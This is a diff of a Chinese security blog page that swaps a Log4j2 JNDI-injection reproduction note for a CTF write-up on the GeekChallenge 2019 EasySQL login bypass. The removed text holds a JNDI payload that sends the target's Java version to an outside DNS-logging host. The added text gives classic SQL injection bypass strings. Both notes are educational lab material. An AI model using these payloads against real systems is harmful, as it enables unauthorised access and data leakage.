@@ -18,24 +18,26 @@
   <meta name="author" content="John Doe">
   <meta name="keywords" content="">
   
-    <meta name="description" content="log4j2简介log4j2是一个java程序的日志监控组件，作为目前java全生态的基础组件之一，应用十分广泛 JNDI注入原理LDAP轻量级目录访问协议，计算机领域常用于统一登录 JNDI概念：java命名和目录接口，根据名字映射到信息资源、位置等。作用：发布服务、查找服务 JNDI动态协议转换：调用JNDI的lookup()方法时，如果是一个uri地址，则客户端会去加载它的远程对象 JNDI">
+    <meta name="description" content="极客大挑战-2019-EasySQL-1打开靶场   根据靶场名字提示，可以知道这是一个SQL注入的靶场，登录框尝试万能密码推测 123451 and 1&#x3D;11&amp;#x27; and &amp;#x27;1&amp;#x27;&#x3D;&amp;#x27;11 or 1&#x3D;1 1&amp;#x27; or &amp;#x27;1&amp;#x27;&#x3D;&amp;#x27;1  通过尝试，and不行，判断此处的SQL语句应为 12SELECT * FROM table">
 <meta property="og:type" content="article">
-<meta property="og:title" content="Apache-log4j2漏洞">
-<meta property="og:url" content="http://example.com/2023/04/24/Apache-log4j2%E6%BC%8F%E6%B4%9E/index.html">
+<meta property="og:title" content="极客大挑战2019-EasySQL-1">
+<meta property="og:url" content="http://example.com/2023/04/24/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-EasySQL-1/index.html">
 <meta property="og:site_name" content="某小网站">
-<meta property="og:description" content="log4j2简介log4j2是一个java程序的日志监控组件，作为目前java全生态的基础组件之一，应用十分广泛 JNDI注入原理LDAP轻量级目录访问协议，计算机领域常用于统一登录 JNDI概念：java命名和目录接口，根据名字映射到信息资源、位置等。作用：发布服务、查找服务 JNDI动态协议转换：调用JNDI的lookup()方法时，如果是一个uri地址，则客户端会去加载它的远程对象 JNDI">
+<meta property="og:description" content="极客大挑战-2019-EasySQL-1打开靶场   根据靶场名字提示，可以知道这是一个SQL注入的靶场，登录框尝试万能密码推测 123451 and 1&#x3D;11&amp;#x27; and &amp;#x27;1&amp;#x27;&#x3D;&amp;#x27;11 or 1&#x3D;1 1&amp;#x27; or &amp;#x27;1&amp;#x27;&#x3D;&amp;#x27;1  通过尝试，and不行，判断此处的SQL语句应为 12SELECT * FROM table">
 <meta property="og:locale" content="zh_CN">
-<meta property="og:image" content="http://example.com/2023/04/24/Apache-log4j2%E6%BC%8F%E6%B4%9E/1682226947539.png">
-<meta property="article:published_time" content="2023-04-24T07:12:12.000Z">
-<meta property="article:modified_time" content="2023-04-24T07:16:21.998Z">
+<meta property="og:image" content="http://example.com/2023/04/24/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-EasySQL-1/1682298792746.png">
+<meta property="og:image" content="http://example.com/2023/04/24/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-EasySQL-1/1682321360291.png">
+<meta property="og:image" content="http://example.com/2023/04/24/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-EasySQL-1/1682321394171.png">
+<meta property="article:published_time" content="2023-04-24T07:50:31.000Z">
+<meta property="article:modified_time" content="2023-04-24T07:55:35.639Z">
 <meta property="article:author" content="John Doe">
-<meta property="article:tag" content="漏洞复现">
+<meta property="article:tag" content="CTF-WEB">
 <meta name="twitter:card" content="summary_large_image">
-<meta name="twitter:image" content="http://example.com/2023/04/24/Apache-log4j2%E6%BC%8F%E6%B4%9E/1682226947539.png">
+<meta name="twitter:image" content="http://example.com/2023/04/24/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-EasySQL-1/1682298792746.png">
   
   
   
-  <title>Apache-log4j2漏洞 - 某小网站</title>
+  <title>极客大挑战2019-EasySQL-1 - 某小网站</title>
 
   <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
 
@@ -189,7 +191,7 @@
       <div class="banner-text text-center fade-in-up">
         <div class="h2">
           
-            <span id="subtitle" data-typed-text="Apache-log4j2漏洞"></span>
+            <span id="subtitle" data-typed-text="极客大挑战2019-EasySQL-1"></span>
           
         </div>
 
@@ -200,7 +202,7 @@
     
       <span class="post-meta">
         <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-        <time datetime="2023-04-24 15:12" pubdate>
+        <time datetime="2023-04-24 15:50" pubdate>
           2023年4月24日 下午
         </time>
       </span>
@@ -212,7 +214,7 @@
       <span class="post-meta mr-2">
         <i class="iconfont icon-chart"></i>
         
-          660 字
+          290 字
         
       </span>
     
@@ -223,7 +225,7 @@
         
         
         
-          6 分钟
+          3 分钟
         
       </span>
     
@@ -262,30 +264,25 @@
         <div id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">Apache-log4j2漏洞</h1>
+            <h1 style="display: none">极客大挑战2019-EasySQL-1</h1>
             
             
               <div class="markdown-body">
                 
-                <h2 id="log4j2简介"><a href="#log4j2简介" class="headerlink" title="log4j2简介"></a>log4j2简介</h2><p>log4j2是一个java程序的日志监控组件，作为目前java全生态的基础组件之一，应用十分广泛</p>
-<h2 id="JNDI注入原理"><a href="#JNDI注入原理" class="headerlink" title="JNDI注入原理"></a>JNDI注入原理</h2><h3 id="LDAP"><a href="#LDAP" class="headerlink" title="LDAP"></a>LDAP</h3><p>轻量级目录访问协议，计算机领域常用于统一登录</p>
-<h3 id="JNDI"><a href="#JNDI" class="headerlink" title="JNDI"></a>JNDI</h3><p>概念：java命名和目录接口，根据名字映射到信息资源、位置等。作用：发布服务、查找服务</p>
-<p>JNDI动态协议转换：调用JNDI的lookup()方法时，如果是一个uri地址，则客户端会去加载它的远程对象</p>
-<p>JNDI命名引用：通过lookup()获取远程对象时，如果获取的reference存根与本地的classpath中的类refClassName是否存在，如果不存在则会去指定的url动态加载</p>
-<h3 id="注入原理"><a href="#注入原理" class="headerlink" title="注入原理"></a>注入原理</h3><p>在JNDI接口注入恶意参数—&gt;恶意参数为一个不存在的refClassName–&gt;对方从指定地址动态加载对象.class文件–&gt;执行static代码块</p>
-<img src="/2023/04/24/Apache-log4j2%E6%BC%8F%E6%B4%9E/1682226947539.png" srcset="/img/loading.gif" lazyload alt="1682226947539" style="zoom:80%;">
+                <h1 id="极客大挑战-2019-EasySQL-1"><a href="#极客大挑战-2019-EasySQL-1" class="headerlink" title="极客大挑战-2019-EasySQL-1"></a>极客大挑战-2019-EasySQL-1</h1><p>打开靶场</p>
+<img src="/2023/04/24/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-EasySQL-1/1682298792746.png" srcset="/img/loading.gif" lazyload alt="1682298792746" style="zoom:80%;">
 
-<h3 id="漏洞产生条件"><a href="#漏洞产生条件" class="headerlink" title="漏洞产生条件"></a>漏洞产生条件</h3><p>使用了lookup()方法，并且这个参数动态可控</p>
-<p>构建LDAP服务来让对方指定远程加载地址为自己的恶意代码地址</p>
-<p>访问LDAP不存在的地址，能够将恶意代码下载到本地并且执行</p>
-<h2 id="漏洞影响范围"><a href="#漏洞影响范围" class="headerlink" title="漏洞影响范围"></a>漏洞影响范围</h2><p>版本&lt;&#x3D;2.41.1</p>
-<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><figure class="highlight roboconf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs roboconf">payload：$&#123;<span class="hljs-attribute">jndi</span>:ldap://$&#123;java:version&#125;<span class="hljs-variable">.dnslog</span><span class="hljs-variable">.cn</span>/test&#125; <br></code></pre></td></tr></table></figure>
+<p>根据靶场名字提示，可以知道这是一个SQL注入的靶场，登录框尝试万能密码推测</p>
+<figure class="highlight basic"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs basic"><span class="hljs-symbol">1 </span><span class="hljs-keyword">and</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span><br><span class="hljs-number">1</span><span class="hljs-comment">&#x27; and &#x27;1&#x27;=&#x27;1</span><br><span class="hljs-symbol">1 </span><span class="hljs-keyword">or</span> <span class="hljs-number">1</span>=<span class="hljs-number">1</span> <br><span class="hljs-number">1</span><span class="hljs-comment">&#x27; or &#x27;1&#x27;=&#x27;1</span><br><br></code></pre></td></tr></table></figure>
 
-<h2 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h2><p>升级log4j2框架为2.15.0版本，2.15.0-rc1和2.15.0-rc2依然存在漏洞</p>
-<p>升级JDK</p>
-<p>修改log4j2配置，将lookup的功能禁用</p>
-<p>使用安全产品防护：WAF、RASP</p>
+<p>通过尝试，and不行，判断此处的SQL语句应为</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">SELECT</span> * <span class="hljs-keyword">FROM</span> <span class="hljs-keyword">tables</span> <span class="hljs-keyword">WHERE</span> username=‘<span class="hljs-number">1</span>’ <span class="hljs-keyword">and</span> ‘<span class="hljs-number">1</span>’=<span class="hljs-number">1</span> <span class="hljs-keyword">and</span> <span class="hljs-keyword">password</span>=<span class="hljs-string">&#x27;输入值&#x27;</span> <br><br></code></pre></td></tr></table></figure>
 
+<p>最终payload为：用户名：test	密码：1’ or ‘1’&#x3D;’1或者1‘ or ’1</p>
+<img src="/2023/04/24/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-EasySQL-1/1682321360291.png" srcset="/img/loading.gif" lazyload alt="1682321360291" style="zoom:80%;">
+
+<p>点击登录，出现flag</p>
+<img src="/2023/04/24/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-EasySQL-1/1682321394171.png" srcset="/img/loading.gif" lazyload alt="1682321394171" style="zoom:80%;">
                 
               </div>
             
@@ -297,7 +294,7 @@
     <div class="post-meta">
       <i class="iconfont icon-tags"></i>
       
-        <a href="/tags/%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0/">#漏洞复现</a>
+        <a href="/tags/CTF-WEB/">#CTF-WEB</a>
       
     </div>
   
@@ -309,8 +306,8 @@
 
   <div class="license-box my-3">
     <div class="license-title">
-      <div>Apache-log4j2漏洞</div>
-      <div>http://example.com/2023/04/24/Apache-log4j2漏洞/</div>
+      <div>极客大挑战2019-EasySQL-1</div>
+      <div>http://example.com/2023/04/24/极客大挑战2019-EasySQL-1/</div>
     </div>
     <div class="license-meta">
       
@@ -354,18 +351,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2023/04/24/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Havefun-1/" title="极客大挑战2019-Havefun-1">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">极客大挑战2019-Havefun-1</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2023/04/24/Nginx%E7%89%88%E6%9C%AC%E6%BC%8F%E6%B4%9E/" title="Nginx版本漏洞">
-                        <span class="hidden-mobile">Nginx版本漏洞</span>
+                      <a href="/2023/04/24/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%982019-Havefun-1/" title="极客大挑战2019-Havefun-1">
+                        <span class="hidden-mobile">极客大挑战2019-Havefun-1</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
